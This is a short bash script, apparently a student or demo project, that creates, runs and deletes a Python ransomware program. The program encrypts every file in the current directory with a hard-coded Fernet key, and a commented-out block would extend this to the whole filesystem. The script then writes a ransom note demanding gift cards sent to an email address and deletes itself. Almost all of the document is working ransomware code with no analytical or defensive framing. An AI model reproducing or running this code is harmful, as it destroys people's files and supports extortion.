#! /bin/bash

# creates the python file malawareAttack.py
cat > malawareAttack.py << EOF
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet


files = []
#adds all files in current directory to files list besides two
for file in os.listdir():
    if file == "malawareAttack.py" or file == "encrypter.sh":
        continue
    if os.path.isfile(file):
        files.append(file)

'''
#adds all files in the file system to files list 

excluded_files = ["malawareAttack.py", "video.sh"]
for dirpath, dirnames, filenames in os.walk('/'):
	for file in filenames:
		if file not in excluded_files:
			files.append(os.path.join(dirpath,file))
'''
print(files)

#encryption key
key = b'7JXX6MEIa28_qDrjoNrQPp1BTI2Q5Yq_YAc9zm_H0RU='

# loops through all the files in list, gets its contents, and encrypts them using key
# then write the encrypted contents back into the file
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)


EOF

#makes sure cryptography package is installed then runs the python file and deletes it 
pip install --upgrade pip 
python3 -m pip install cryptography
python3 malawareAttack.py
rm malawareAttack.py

#creates the ReadMe.Txt file
cat > ReadMe.txt << EOF
Yikes! All of your files have been encrypted by a malaware!
To get them unencrypted, you must send 100 dollars in amazon gift cards to
the email example@hotmail.com or else your files will be gone 
FOREVER!

EOF

# deletes the encrypter.sh file
rm encrypter.sh







